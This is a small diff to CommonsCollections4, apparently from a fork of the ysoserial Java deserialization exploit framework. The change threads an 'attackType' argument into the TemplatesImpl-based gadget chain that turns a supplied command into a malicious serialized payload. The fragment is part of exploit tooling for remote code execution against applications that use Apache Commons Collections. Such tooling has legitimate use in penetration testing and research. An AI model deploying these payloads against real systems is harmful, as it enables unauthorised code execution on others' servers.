@@ -27,9 +27,11 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
+	
+	// federicodotta - All supported (TemplateImpl)
 
 	public Queue<Object> getObject(final String command, String attackType) throws Exception {
-		Object templates = Gadgets.createTemplatesImpl(command);
+		Object templates = Gadgets.createTemplatesImpl(command, attackType);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
 
